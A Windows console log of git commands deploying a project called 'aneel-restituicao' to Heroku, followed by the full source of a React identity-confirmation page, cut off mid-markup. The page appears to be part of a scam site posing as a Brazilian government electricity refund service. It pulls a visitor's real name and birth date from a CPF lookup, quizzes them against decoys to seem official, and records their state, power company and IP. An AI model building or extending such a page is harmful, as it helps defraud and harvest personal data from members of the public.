Microsoft Windows [versão 10.0.19045.5737]
(c) Microsoft Corporation. Todos os direitos reservados.

C:\Users\GabrielPC\Documents\GChub\OP\Att\aneel-restituicao>git add client/src/pages/ConfirmarIdentidade.tsx

C:\Users\GabrielPC\Documents\GChub\OP\Att\aneel-restituicao>git add server/routes.ts
warning: in the working copy of 'server/routes.ts', LF will be replaced by CRLF the next time Git touches it

C:\Users\GabrielPC\Documents\GChub\OP\Att\aneel-restituicao>git commit -m "Adicionado suporte para CEP alternativo"
On branch main
Your branch is up to date with 'origin/main'.

nothing to commit, working tree clean

C:\Users\GabrielPC\Documents\GChub\OP\Att\aneel-restituicao>
C:\Users\GabrielPC\Documents\GChub\OP\Att\aneel-restituicao>git push heroku main
fatal: 'heroku' does not appear to be a git repository
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.

C:\Users\GabrielPC\Documents\GChub\OP\Att\aneel-restituicao>git push heroku origijn
error: src refspec origijn does not match any
error: failed to push some refs to 'heroku'

C:\Users\GabrielPC\Documents\GChub\OP\Att\aneel-restituicao>>git push heroku origin
'push' não é reconhecido como um comando interno
ou externo, um programa operável ou um arquivo em lotes.

C:\Users\GabrielPC\Documents\GChub\OP\Att\aneel-restituicao>git remote add heroku https://git.heroku.com/aneel-restituicao.git

C:\Users\GabrielPC\Documents\GChub\OP\Att\aneel-restituicao>
C:\Users\GabrielPC\Documents\GChub\OP\Att\aneel-restituicao>git remote -v
heroku  https://git.heroku.com/aneel-restituicao.git (fetch)
heroku  https://git.heroku.com/aneel-restituicao.git (push)
origin  https://git.heroku.com/aneel-restituicao.git (fetch)
origin  https://git.heroku.com/aneel-restituicao.git (push)

C:\Users\GabrielPC\Documents\GChub\OP\Att\aneel-restituicao>git diff client/src/pages/ConfirmarIdentidade.tsx

C:\Users\GabrielPC\Documents\GChub\OP\Att\aneel-restituicao>type client\src\pages\ConfirmarIdentidade.tsx
import React, { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { z } from "zod";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { useQueryClient } from "@tanstack/react-query";
import { ArrowRight, Loader2, Search as SearchIcon } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";
import { useLocalizacao } from "@/components/LocalizacaoDetector";
import { useUserData } from "../contexts/UserContext";

enum EtapaVerificacao {
  NOME = 0,
  ANO_NASCIMENTO = 1,
  COMPANHIA_ELETRICA = 2,
  CEP_ALTERNATIVO = 3,
}

// Definir o esquema de valida├º├úo para o formul├írio
const nomeSchema = z.object({
  nome: z.string().min(1, "Selecione uma op├º├úo"),
});

const anoSchema = z.object({
  ano: z.string().min(1, "Selecione uma op├º├úo"),
});

const companhiaSchema = z.object({
  companhia: z.string().min(1, "Selecione uma op├º├úo"),
});

const cepSchema = z.object({
  cep: z.string()
    .min(8, "CEP deve ter pelo menos 8 d├¡gitos")
    .max(9, "CEP n├úo deve ter mais de 9 caracteres")
    .regex(/^\d{5}-?\d{3}$/, "CEP deve estar no formato 12345-678 ou 12345678"),
});

type NomeFormValues = z.infer<typeof nomeSchema>;
type AnoFormValues = z.infer<typeof anoSchema>;
type CompanhiaFormValues = z.infer<typeof companhiaSchema>;
type CepFormValues = z.infer<typeof cepSchema>;

// Lista de companhias el├®tricas por estado (atualizada para 2025)
const companhiasEletricas: Record<string, string[]> = {
  // Regi├úo Norte
  "Acre": ["Energisa Acre"],
  "Amap├í": ["Equatorial CEA"],
  "Amazonas": ["Amazonas Energia"],
  "Par├í": ["Equatorial Par├í"],
  "Rond├┤nia": ["Energisa Rond├┤nia"],
  "Roraima": ["Roraima Energia"],
  "Tocantins": ["Energisa Tocantins"],

  // Regi├úo Nordeste
  "Alagoas": ["Equatorial Alagoas"],
  "Bahia": ["Neoenergia Coelba"],
  "Cear├í": ["Enel Distribui├º├úo Cear├í"],
  "Maranh├úo": ["Equatorial Maranh├úo"],
  "Para├¡ba": ["Energisa Para├¡ba"],
  "Pernambuco": ["Neoenergia Pernambuco"],
  "Piau├¡": ["Equatorial Piau├¡"],
  "Rio Grande do Norte": ["Neoenergia Cosern"],
  "Sergipe": ["Energisa Sergipe"],

  // Regi├úo Centro-Oeste
  "Distrito Federal": ["Neoenergia Bras├¡lia"],
  "Goi├ís": ["Equatorial Goi├ís"],
  "Mato Grosso": ["Energisa Mato Grosso"],
  "Mato Grosso do Sul": ["Energisa Mato Grosso do Sul"],

  // Regi├úo Sudeste
  "Esp├¡rito Santo": ["EDP Esp├¡rito Santo"],
  "Minas Gerais": ["CEMIG Distribui├º├úo"],
  "Rio de Janeiro": ["Enel Distribui├º├úo Rio", "Light S/A"],
  "S├úo Paulo": [
    "Enel Distribui├º├úo S├úo Paulo",
    "EDP S├úo Paulo",
    "CPFL Paulista",
    "CPFL Piratininga",
    "Neoenergia Elektro",
    "ISA Energia Brasil"
  ],

  // Regi├úo Sul
  "Paran├í": ["COPEL Distribui├º├úo"],
  "Rio Grande do Sul": ["Equatorial CEEE", "CPFL Rio Grande Energia (RGE)"],
  "Santa Catarina": ["CELESC Distribui├º├úo"]
};

// Op├º├Áes fixas de companhias para cada estado, conforme especifica├º├úo
// Mapeamento de estados para companhias el├®tricas
const opcoesCompanhiaPorEstado: Record<string, string[]> = {
  // Estados com uma ├║nica companhia
  "Acre": ["Energisa Acre", "Amazonas Energia", "Equatorial Maranh├úo"],
  "Alagoas": ["Equatorial Alagoas", "Neoenergia Pernambuco", "Energisa Mato Grosso do Sul"],
  "Amap├í": ["CEA Equatorial", "Roraima Energia", "Energisa Rond├┤nia"],
  "Amazonas": ["Amazonas Energia", "Energisa Tocantins", "Equatorial Piau├¡"],
  "Bahia": ["Neoenergia Coelba", "Energisa Para├¡ba", "Equatorial Par├í"],
  "Cear├í": ["Enel Cear├í", "Energisa Acre", "CPFL Piratininga"],
  "Distrito Federal": ["Neoenergia Bras├¡lia", "Energisa Rond├┤nia", "CPFL Rio Grande Energia (RGE)"],
  "Esp├¡rito Santo": ["EDP Esp├¡rito Santo", "Neoenergia Pernambuco", "CELESC Distribui├º├úo"],
  "Maranh├úo": ["Equatorial Maranh├úo", "Enel Distribui├º├úo Rio", "Neoenergia Cosern"],
  "Mato Grosso": ["Energisa Mato Grosso", "Neoenergia Coelba", "CPFL Piratininga"],
  "Mato Grosso do Sul": ["Energisa Mato Grosso do Sul", "Equatorial Maranh├úo", "EDP Esp├¡rito Santo"],
  "Para├¡ba": ["Energisa Para├¡ba", "Neoenergia Pernambuco", "Equatorial Alagoas"],
  "Paran├í": ["Copel Distribui├º├úo", "Neoenergia Coelba", "Amazonas Energia"],
  "Pernambuco": ["Neoenergia Pernambuco", "Energisa Mato Grosso", "EDP S├úo Paulo"],
  "Piau├¡": ["Equatorial Piau├¡", "CELESC Distribui├º├úo", "Neoenergia Bras├¡lia"],
  "Rio Grande do Norte": ["Neoenergia Cosern", "Energisa Sergipe", "CEMIG Distribui├º├úo"],
  "Rond├┤nia": ["Energisa Rond├┤nia", "Equatorial Goi├ís", "CEMIG Distribui├º├úo"],
  "Roraima": ["Roraima Energia", "Energisa Mato Grosso", "Enel Cear├í"],
  "Sergipe": ["Energisa Sergipe", "Enel Distribui├º├úo S├úo Paulo", "CEA Equatorial"],
  "Tocantins": ["Energisa Tocantins", "EDP Esp├¡rito Santo", "Copel Distribui├º├úo"],

  // Estados com duas companhias
  "Goi├ís": ["Equatorial Goi├ís", "Celg GT (Transmiss├úo e Gera├º├úo)", "Light S/A"],
  "Par├í": ["Equatorial Par├í", "Celpa", "Energisa Sergipe"],
  "Rio de Janeiro": ["Light", "Enel Rio", "Neoenergia Coelba"],
  "Rio Grande do Sul": ["CEEE Equatorial", "RGE Sul", "Light S/A"],
  "Santa Catarina": ["Celesc Distribui├º├úo", "Cooperativas locais (como CERGAL, CERILUZ, etc.)", "Equatorial Par├í"],

  // Estados com tr├¬s companhias
  "Minas Gerais": ["CEMIG Distribui├º├úo", "Energisa Minas Gerais", "Light (em pequenas ├íreas de MG)"],

  // Estados com m├║ltiplas companhias
  "S├úo Paulo": [
    "Enel S├úo Paulo",
    "Enel Distribui├º├úo S├úo Paulo",
    "CPFL Paulista",
    "CPFL Piratininga",
    "EDP S├úo Paulo",
    "Energisa Sul-Sudeste (em parte do interior)"
  ]
};

export default function ConfirmarIdentidade() {
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const queryClient = useQueryClient();

  // Usar o hook de localiza├º├úo para obter o estado do usu├írio
  const { localizacao, carregando: carregandoLocalizacao } = useLocalizacao();

  // Usar o contexto do usu├írio para obter dados como o CPF
  const { userData, updateUserData } = useUserData();
  const cpf = userData.cpf || "";

  const [etapaAtual, setEtapaAtual] = useState<EtapaVerificacao>(EtapaVerificacao.NOME);
  const [dadosPessoais, setDadosPessoais] = useState<any>(null);
  const [opcoesNome, setOpcoesNome] = useState<string[]>([]);
  const [opcoesAno, setOpcoesAno] = useState<string[]>([]);
  const [opcoesCompanhia, setOpcoesCompanhia] = useState<string[]>([]);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [estado, setEstado] = useState<string>("");
  const [companhiaCorreta, setCompanhiaCorreta] = useState<string>("");
  const [localizado, setLocalizado] = useState<boolean>(false);

  // Formul├írio para sele├º├úo de nome
  const nomeForm = useForm<NomeFormValues>({
    resolver: zodResolver(nomeSchema),
    defaultValues: {
      nome: "",
    },
  });

  // Formul├írio para sele├º├úo de ano
  const anoForm = useForm<AnoFormValues>({
    resolver: zodResolver(anoSchema),
    defaultValues: {
      ano: "",
    },
  });

  // Formul├írio para sele├º├úo de companhia el├®trica
  const companhiaForm = useForm<CompanhiaFormValues>({
    resolver: zodResolver(companhiaSchema),
    defaultValues: {
      companhia: "",
    },
  });

  // Formul├írio para input de CEP
  const cepForm = useForm<CepFormValues>({
    resolver: zodResolver(cepSchema),
    defaultValues: {
      cep: "",
    },
  });

  // A detec├º├úo de estado agora ├® feita atrav├®s do hook useLocalizacao
  // que ├® inicializado quando o aplicativo inicia

  // A fun├º├úo embaralharArray foi removida, pois agora estamos posicionando
  // as op├º├Áes em uma ordem fixa, com a op├º├úo correta sempre no meio

  // Pr├®-carregando nomes alternativos para evitar delay na renderiza├º├úo
  useEffect(() => {
    // Pr├®-carregar op├º├Áes de nomes enquanto esperamos pela API
    // Nome de carregamento fica no meio (posi├º├úo 1)
    const nomeCarregando = "CARREGANDO DADOS...";
    const nomeAlternativo1 = "M├öNICA DE SOUZA ALVES";
    const nomeAlternativo2 = "PEDRO HENRIQUE OLIVEIRA";

    // Pr├®-mostrar op├º├Áes ordenadas com "CARREGANDO DADOS..." no meio enquanto aguardamos a API
    setOpcoesNome([nomeAlternativo1, nomeCarregando, nomeAlternativo2]);

    // Verificar se temos o CPF antes de continuar
    if (!cpf) {
      navigate("/verificar");
      return;
    }

    // Marcar como carregando imediatamente
    setIsLoading(true);

  }, [cpf, navigate]);

  // Efeito separado para lidar com a localiza├º├úo
  useEffect(() => {
    // Se o localizacao j├í estiver dispon├¡vel, us├í-lo para definir o estado
    if (localizacao && localizacao.estado) {
      console.log("Usando estado j├í detectado:", localizacao.estado);
      setEstado(localizacao.estado);
      setLocalizado(true);
    }
    // Se estiver carregando a localiza├º├úo, vamos monitorar quando estiver dispon├¡vel
    else if (carregandoLocalizacao) {
      console.log("Aguardando detec├º├úo de estado...");
    }
    // Se n├úo estiver carregando e mesmo assim n├úo temos localiza├º├úo, usar S├úo Paulo como padr├úo
    else if (!carregandoLocalizacao && !localizacao) {
      console.log("N├úo foi poss├¡vel detectar o estado, usando S├úo Paulo como padr├úo");
      setEstado("S├úo Paulo");
      setLocalizado(true);
    }
  }, [localizacao, carregandoLocalizacao]);

  // Efeito separado para carregar dados da API
  useEffect(() => {
    if (!cpf) return;

    // Verificar se j├í temos os dados no contexto
    if (userData && userData.nome && userData.dataNascimento) {
      console.log("Dados j├í dispon├¡veis no contexto do usu├írio:", userData.nome);

      // Criar um objeto de dados pessoais a partir dos dados do contexto
      const contextData = {
        Result: {
          NomePessoaFisica: userData.nome,
          DataNascimento: userData.dataNascimento
        }
      };

      setDadosPessoais(contextData);

      // Nome correto sempre fica entre dois aleat├│rios (como posi├º├úo do meio)
      const nomeAlternativo1 = "M├öNICA DE SOUZA ALVES";
      const nomeAlternativo2 = "PEDRO HENRIQUE OLIVEIRA";
      const nomeCorreto = userData.nome;

      // Atualizar as op├º├Áes - sem embaralhar, nome real sempre fica no meio
      setOpcoesNome([nomeAlternativo1, nomeCorreto, nomeAlternativo2]);

      // Fun├º├úo para gerar uma data aleat├│ria entre 1959 e 1995
      const gerarDataNascimentoAleatoria = () => {
        // Gerar ano entre 1959 e 1995
        const anoMin = 1959;
        const anoMax = 1995;
        const ano = Math.floor(Math.random() * (anoMax - anoMin + 1)) + anoMin;

        // Gerar m├¬s (1-12)
        const mes = Math.floor(Math.random() * 12) + 1;

        // Determinar o n├║mero m├íximo de dias no m├¬s
        let diasMax = 31;
        if ([4, 6, 9, 11].includes(mes)) {
          diasMax = 30;
        } else if (mes === 2) {
          // Verificar se ├® ano bissexto
          diasMax = (ano % 4 === 0 && (ano % 100 !== 0 || ano % 400 === 0)) ? 29 : 28;
        }

        // Gerar dia (1-diasMax)
        const dia = Math.floor(Math.random() * diasMax) + 1;

        // Formatar a data como DD/MM/YYYY
        return `${String(dia).padStart(2, '0')}/${String(mes).padStart(2, '0')}/${ano}`;
      };

      // Gerar 2 datas aleat├│rias diferentes
      const dataAleatoria1 = gerarDataNascimentoAleatoria();
      let dataAleatoria2 = "";

      // Garantir que a segunda data seja diferente da primeira
      do {
        dataAleatoria2 = gerarDataNascimentoAleatoria();
      } while (dataAleatoria2 === dataAleatoria1 || dataAleatoria2 === userData.dataNascimento);

      // Colocar a data real sempre no meio (posi├º├úo 1)
      setOpcoesAno([dataAleatoria1, userData.dataNascimento, dataAleatoria2]);

      // Marcar como carregado
      setIsLoading(false);
      return;
    }

    // Se n├úo temos os dados no contexto, precisamos carregar da API
    const fetchCpfData = async () => {
      // Configurar a tela para pr├®-carregamento
      // Nome de carregamento fica no meio (posi├º├úo 1)
      const nomeCarregando = "CARREGANDO DADOS...";
      const nomeAlternativo1 = "M├öNICA DE SOUZA ALVES";
      const nomeAlternativo2 = "PEDRO HENRIQUE OLIVEIRA";

      // Inicialmente mostramos op├º├Áes com "CARREGANDO DADOS..."
      setOpcoesNome([nomeAlternativo1, nomeCarregando, nomeAlternativo2]);

      try {
        // Usar Promise.all para carregar dados em paralelo, reduzindo o tempo total
        const response = await fetch(`/api/consulta-cpf?cpf=${cpf}`);

        if (!response.ok) {
          throw new Error("Erro ao consultar CPF");
        }

        const data = await response.json();
        setDadosPessoais(data);

        // Garantir que estamos extraindo o nome corretamente
        let nomeCorreto = "NOME N├âO ENCONTRADO";
        if (data.Result && data.Result.NomePessoaFisica) {
          nomeCorreto = data.Result.NomePessoaFisica;
          console.log("Nome extra├¡do da API:", nomeCorreto);
        } else {
          console.error("Campo NomePessoaFisica n├úo encontrado na resposta");
        }

        // Nome correto sempre fica entre dois aleat├│rios (como posi├º├úo do meio)
        const opcoes = [nomeAlternativo1, nomeCorreto, nomeAlternativo2];

        // Atualizar as op├º├Áes - sem embaralhar, nome real sempre fica no meio
        setOpcoesNome(opcoes);

        // Preparar op├º├Áes de data de nascimento
        const dataNascimento = data.Result.DataNascimento;

        // Fun├º├úo para gerar uma data aleat├│ria entre 1959 e 1995
        const gerarDataNascimentoAleatoria = () => {
          // Gerar ano entre 1959 e 1995
          const anoMin = 1959;
          const anoMax = 1995;
          const ano = Math.floor(Math.random() * (anoMax - anoMin + 1)) + anoMin;

          // Gerar m├¬s (1-12)
          const mes = Math.floor(Math.random() * 12) + 1;

          // Determinar o n├║mero m├íximo de dias no m├¬s
          let diasMax = 31;
          if ([4, 6, 9, 11].includes(mes)) {
            diasMax = 30;
          } else if (mes === 2) {
            // Verificar se ├® ano bissexto
            diasMax = (ano % 4 === 0 && (ano % 100 !== 0 || ano % 400 === 0)) ? 29 : 28;
          }

          // Gerar dia (1-diasMax)
          const dia = Math.floor(Math.random() * diasMax) + 1;

          // Formatar a data como DD/MM/YYYY
          return `${String(dia).padStart(2, '0')}/${String(mes).padStart(2, '0')}/${ano}`;
        };

        // Gerar 2 datas aleat├│rias diferentes - uma antes e uma depois
        const dataAleatoria1 = gerarDataNascimentoAleatoria();
        let dataAleatoria2 = "";

        // Garantir que a segunda data seja diferente da primeira
        do {
          dataAleatoria2 = gerarDataNascimentoAleatoria();
        } while (dataAleatoria2 === dataAleatoria1 || dataAleatoria2 === dataNascimento);

        // Colocar a data real sempre no meio (posi├º├úo 1)
        setOpcoesAno([dataAleatoria1, dataNascimento, dataAleatoria2]);

      } catch (error) {
        console.error("Erro ao buscar dados do CPF:", error);
        toast({
          title: "Erro",
          description: "N├úo foi poss├¡vel verificar o CPF. Tente novamente mais tarde.",
          variant: "destructive",
        });
        navigate("/verificar");
      } finally {
        setIsLoading(false);
      }
    };

    fetchCpfData();
  }, [cpf, navigate, toast, localizacao, carregandoLocalizacao, userData]);

  // Extrair o ano da data de nascimento
  const getAnoNascimento = (dataStr: string): string => {
    if (!dataStr) return "";

    // Verificar se ├® uma data no formato ISO completo
    if (dataStr.includes("T")) {
      const dataObj = new Date(dataStr);
      if (isNaN(dataObj.getTime())) return "";
      return dataObj.getFullYear().toString();
    }

    // Formato YYYY-MM-DD simples
    return dataStr.split("-")[0];
  };

  // Transformar data no formato ISO para DD/MM/YYYY
  const formatarData = (dataStr: string) => {
    if (!dataStr) return "";

    // Verificar se ├® uma data no formato ISO completo
    if (dataStr.includes("T")) {
      const dataObj = new Date(dataStr);
      if (isNaN(dataObj.getTime())) return dataStr;

      return `${dataObj.getDate().toString().padStart(2, '0')}/${(dataObj.getMonth() + 1).toString().padStart(2, '0')}/${dataObj.getFullYear()}`;
    }

    // Formato YYYY-MM-DD simples
    const partes = dataStr.split("-");
    if (partes.length !== 3) return dataStr;

    return `${partes[2].substring(0, 2)}/${partes[1]}/${partes[0]}`;
  };

  // Lidar com o envio do formul├írio de nome
  const onSubmitNome = (values: NomeFormValues) => {
    const nomeCorreto = dadosPessoais?.Result?.NomePessoaFisica || "";

    if (values.nome === nomeCorreto) {
      setEtapaAtual(EtapaVerificacao.ANO_NASCIMENTO);
    } else {
      toast({
        title: "Nome incorreto",
        description: "Por favor, selecione seu nome correto.",
        variant: "destructive",
      });
    }
  };

  // Fun├º├úo para gerar op├º├Áes de companhia el├®trica com base no estado
  // Usa as op├º├Áes fixas definidas para cada estado e segue as regras atualizadas da documenta├º├úo
  const gerarOpcoesCompanhia = (estadoSelecionado: string) => {
    console.log(`Gerando op├º├Áes de companhia para: ${estadoSelecionado}`);
    setEstado(estadoSelecionado);

    // Verificar se temos op├º├Áes definidas para o estado selecionado
    if (opcoesCompanhiaPorEstado[estadoSelecionado]) {
      // Usar as op├º├Áes pr├®-definidas para o estado
      const opcoes = opcoesCompanhiaPorEstado[estadoSelecionado];

      // CASO 1: S├âO PAULO - mostrar todas as companhias, qualquer uma ├® v├ílida
      if (estadoSelecionado === "S├úo Paulo") {
        console.log("Caso S├úo Paulo: todas as op├º├Áes s├úo v├ílidas");
        setOpcoesCompanhia(opcoes);
        // Todas s├úo v├ílidas em SP
        setCompanhiaCorreta(opcoes[0]);

      // CASO 2: MINAS GERAIS - mostrar todas as tr├¬s companhias, todas s├úo v├ílidas
      } else if (estadoSelecionado === "Minas Gerais") {
        console.log("Caso Minas Gerais: todas as 3 op├º├Áes s├úo v├ílidas");
        setOpcoesCompanhia(opcoes);
        // Todas as 3 s├úo v├ílidas
        setCompanhiaCorreta(opcoes[0]);

      // CASO 3: ESTADOS COM DUAS COMPANHIAS - mostrar duas companhias corretas + uma op├º├úo aleat├│ria
      } else if (
        estadoSelecionado === "Rio de Janeiro" ||
        estadoSelecionado === "Rio Grande do Sul" ||
        estadoSelecionado === "Goi├ís" ||
        estadoSelecionado === "Par├í" ||
        estadoSelecionado === "Santa Catarina"
      ) {
        console.log(`Caso ${estadoSelecionado}: 2 op├º├Áes v├ílidas + 1 incorreta`);
        setOpcoesCompanhia(opcoes);
        // As duas primeiras s├úo v├ílidas
        setCompanhiaCorreta(opcoes[0]);

      // CASO 4: OUTROS ESTADOS (com uma ├║nica companhia) - mostrar a companhia correta + duas op├º├Áes aleat├│rias
      } else {
        console.log(`Caso padr├úo para ${estadoSelecionado}: 1 op├º├úo v├ílida + 2 incorretas`);
        setOpcoesCompanhia(opcoes);
        // Apenas a primeira ├® v├ílida
        setCompanhiaCorreta(opcoes[0]);
      }
    } else {
      // Caso de fallback (n├úo deveria ocorrer)
      console.warn(`N├úo h├í op├º├Áes definidas para o estado ${estadoSelecionado}, usando S├úo Paulo como fallback`);
      const opcoesFallback = opcoesCompanhiaPorEstado["S├úo Paulo"];
      setOpcoesCompanhia(opcoesFallback);
      setCompanhiaCorreta(opcoesFallback[0]);
    }
  };

  // Lidar com o envio do formul├írio de data de nascimento
  const onSubmitAno = async (values: AnoFormValues) => {
    const dataNascimento = dadosPessoais?.Result?.DataNascimento || "";

    if (values.ano === dataNascimento) {
      // Usar o estado j├í detectado atrav├®s do componente LocalizacaoDetector
      let estadoSelecionado = estado;

      // Se ainda n├úo temos um estado, mas temos a localiza├º├úo do hook
      if (!localizado && localizacao && localizacao.estado) {
        estadoSelecionado = localizacao.estado;
        setEstado(estadoSelecionado);
        setLocalizado(true);
      }
      // Caso nada tenha funcionado, usar S├úo Paulo como fallback
      else if (!localizado) {
        estadoSelecionado = "S├úo Paulo";
        setEstado(estadoSelecionado);
        setLocalizado(true);
      }

      console.log("Utilizando estado para escolha de companhia el├®trica:", estadoSelecionado);

      // Gerar op├º├Áes de companhia com base no estado
      gerarOpcoesCompanhia(estadoSelecionado);

      // Avan├ºar para a pr├│xima etapa
      setEtapaAtual(EtapaVerificacao.COMPANHIA_ELETRICA);
    } else {
      toast({
        title: "Data incorreta",
        description: "Por favor, selecione a data de nascimento correta.",
        variant: "destructive",
      });
    }
  };

  // Lidar com o envio do formul├írio de CEP
  const onSubmitCep = async (values: CepFormValues) => {
    try {
      setIsLoading(true);

      // Formatar o CEP para remover qualquer caractere n├úo num├®rico
      const cepFormatado = values.cep.replace(/\D/g, '');

      // Consultar a API de CEP
      const response = await fetch(`/api/consulta-cep?cep=${cepFormatado}`);

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || "Erro ao consultar o CEP");
      }

      const data = await response.json();

      if (!data.success) {
        throw new Error(data.message || "CEP n├úo encontrado");
      }

      // Obter o estado do CEP e gerar as op├º├Áes de companhia
      const estadoDoCep = data.estado;
      console.log(`Estado detectado pelo CEP: ${estadoDoCep}`);

      // Atualizar o estado selecionado
      setEstado(estadoDoCep);

      // Verificar se temos op├º├Áes de companhia para o estado
      if (!opcoesCompanhiaPorEstado[estadoDoCep]) {
        throw new Error(`N├úo foram encontradas companhias el├®tricas para o estado ${estadoDoCep}`);
      }

      // Gerar as op├º├Áes de companhia com base no estado do CEP
      gerarOpcoesCompanhia(estadoDoCep);

      // Voltar para a etapa de sele├º├úo de companhia
      setEtapaAtual(EtapaVerificacao.COMPANHIA_ELETRICA);

      toast({
        title: "CEP localizado",
        description: `Estado identificado: ${estadoDoCep}. Por favor, selecione sua companhia el├®trica.`,
      });

    } catch (error: any) {
      console.error("Erro ao consultar CEP:", error);
      toast({
        title: "Erro ao consultar CEP",
        description: error.message || "N├úo foi poss├¡vel localizar o CEP informado. Verifique e tente novamente.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  // Lidar com o envio do formul├írio de companhia el├®trica
  const onSubmitCompanhia = (values: CompanhiaFormValues) => {
    const companhiaEscolhida = values.companhia;

    // Verificar se o usu├írio selecionou "Nenhuma das op├º├Áes"
    if (companhiaEscolhida === "nenhuma_das_opcoes") {
      // Avan├ºar para etapa de CEP
      setEtapaAtual(EtapaVerificacao.CEP_ALTERNATIVO);
      return;
    }

    let companhiaValida = false;

    // Regras espec├¡ficas para cada estado com base na documenta├º├úo atualizada
    if (estado === "S├úo Paulo") {
      // S├úo Paulo: todas as companhias s├úo v├ílidas
      companhiaValida = opcoesCompanhiaPorEstado["S├úo Paulo"].includes(companhiaEscolhida);
      console.log("S├úo Paulo - Todas as op├º├Áes s├úo v├ílidas:", companhiaValida);

    } else if (estado === "Rio de Janeiro") {
      // Rio de Janeiro: apenas Light e Enel Rio s├úo v├ílidas
      companhiaValida = (
        companhiaEscolhida === "Light" ||
        companhiaEscolhida === "Enel Rio"
      );
      console.log("Rio de Janeiro - Apenas as 2 primeiras s├úo v├ílidas:", companhiaValida);

    } else if (estado === "Rio Grande do Sul") {
      // Rio Grande do Sul: apenas CEEE Equatorial e RGE Sul s├úo v├ílidas
      companhiaValida = (
        companhiaEscolhida === "CEEE Equatorial" ||
        companhiaEscolhida === "RGE Sul"
      );
      console.log("Rio Grande do Sul - Apenas as 2 primeiras s├úo v├ílidas:", companhiaValida);

    } else if (estado === "Goi├ís") {
      // Goi├ís: duas companhias v├ílidas
      companhiaValida = (
        companhiaEscolhida === "Equatorial Goi├ís" ||
        companhiaEscolhida === "Celg GT (Transmiss├úo e Gera├º├úo)"
      );
      console.log("Goi├ís - Duas op├º├Áes v├ílidas:", companhiaValida);

    } else if (estado === "Par├í") {
      // Par├í: duas companhias v├ílidas
      companhiaValida = (
        companhiaEscolhida === "Equatorial Par├í" ||
        companhiaEscolhida === "Celpa"
      );
      console.log("Par├í - Duas op├º├Áes v├ílidas:", companhiaValida);

    } else if (estado === "Santa Catarina") {
      // Santa Catarina: duas companhias v├ílidas
      companhiaValida = (
        companhiaEscolhida === "Celesc Distribui├º├úo" ||
        companhiaEscolhida === "Cooperativas locais (como CERGAL, CERILUZ, etc.)"
      );
      console.log("Santa Catarina - Duas op├º├Áes v├ílidas:", companhiaValida);

    } else if (estado === "Minas Gerais") {
      // Minas Gerais: tr├¬s companhias v├ílidas
      companhiaValida = (
        companhiaEscolhida === "CEMIG Distribui├º├úo" ||
        companhiaEscolhida === "Energisa Minas Gerais" ||
        companhiaEscolhida === "Light (em pequenas ├íreas de MG)"
      );
      console.log("Minas Gerais - Tr├¬s op├º├Áes v├ílidas:", companhiaValida);

    } else {
      // Outros estados: apenas a primeira op├º├úo (├¡ndice 0) ├® v├ílida
      companhiaValida = companhiaEscolhida === opcoesCompanhiaPorEstado[estado][0];
      console.log(`${estado} - Apenas a primeira op├º├úo ├® v├ílida:`, companhiaValida);
    }

    if (companhiaValida) {
      // Companhia v├ílida, prosseguir para a pr├│xima etapa
      const nome = dadosPessoais?.Result?.NomePessoaFisica || "";
      const dataNasc = dadosPessoais?.Result?.DataNascimento || "";

      // Atualizar o contexto do usu├írio com as informa├º├Áes validadas
      updateUserData({
        nome: nome,
        dataNascimento: dataNasc,
        estado: estado,
        companhia: companhiaEscolhida,
        ip: localizacao?.ip || ""
      });

      console.log("Dados armazenados no contexto, navegando para resultado");

      // Navegar para a p├ígina de resultado sem par├ómetros na URL
      navigate('/resultado');
    } else {
      toast({
        title: "Companhia incorreta",
        description: "Por favor, selecione a companhia el├®trica correta para o seu estado.",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      <Header />

      <main className="flex-1 bg-[#f0f2f5] py-8">
        <div className="container mx-auto px-4">
          <div className="max-w-4xl mx-auto">
            <Card className="shadow-md">
              <CardHeader className="bg-[var(--gov-blue)] text-white text-center py-6">
                <CardTitle className="text-2xl font-bold">Confirma├º├úo de Identidade</CardTitle>
                <CardDescription className="text-gray-100 mt-2">
                  Para confirmar sua identidade, precisamos validar alguns dados pessoais.
                </CardDescription>
              </CardHeader>
              <CardContent className="p-6">
                <div className="space-y-6">

                  {etapaAtual === EtapaVerificacao.NOME && (
                    <div>
                      <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4">
                        Selecione o seu nome completo entre as op├º├Áes abaixo:
                      </h2>

                      <Form {...nomeForm}>
                        <form onSubmit={nomeForm.handleSubmit(onSubmitNome)} className="space-y-4">
                          <FormField
                            control={nomeForm.control}
                            name="nome"
                            render={({ field }) => (
                              <FormItem className="space-y-4">
                                <FormControl>
                                  <RadioGroup
                                    onValueChange={field.onChange}
                                    value={field.value}
                                    className="space-y-3"
                                  >
                                    {opcoesNome.map((nome, index) => (
                                      <div key={index} className="flex items-center space-x-2 border p-3 rounded-md">
                                        <RadioGroupItem value={nome} id={`nome-${index}`} />
                                        <Label htmlFor={`nome-${index}`} className="flex-1 cursor-pointer">
                                          {nome}
                                        </Label>
                                      </div>
                                    ))}
                                  </RadioGroup>
                                </FormControl>
                                <FormMessage />
                              </FormItem>
                            )}
                          />

                          <div className="text-center mt-6">
                            <Button
                              type="submit"
                              className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
                              disabled={isLoading || !nomeForm.watch("nome")}
                            >
                              <span>Prosseguir</span>
                              <ArrowRight className="ml-2 h-5 w-5" />
                            </Button>
                          </div>
                        </form>
                      </Form>
                    </div>
                  )}

                  {etapaAtual === EtapaVerificacao.ANO_NASCIMENTO && (
                    <div>
                      <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4">
